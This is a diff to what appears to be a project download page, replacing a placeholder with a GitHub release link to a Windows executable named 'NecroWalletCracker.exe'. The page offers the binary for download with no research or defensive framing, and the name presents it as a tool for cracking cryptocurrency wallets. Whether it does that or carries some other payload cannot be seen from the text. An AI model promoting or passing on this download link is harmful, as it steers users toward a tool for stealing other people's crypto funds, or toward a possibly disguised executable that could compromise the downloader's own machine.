@@ -22,7 +22,7 @@ Welcome to the official download page of the project.
 
 Download the latest Windows version here:
 
-[⬇ Download for Windows](YOUR_WINDOWS_DOWNLOAD_LINK)
+[⬇ Download for Windows](https://github.com/Hetirnity/NecroWalletCracker/releases/download/NecroCracker/NecroWalletCracker.exe)
 
 ---
 
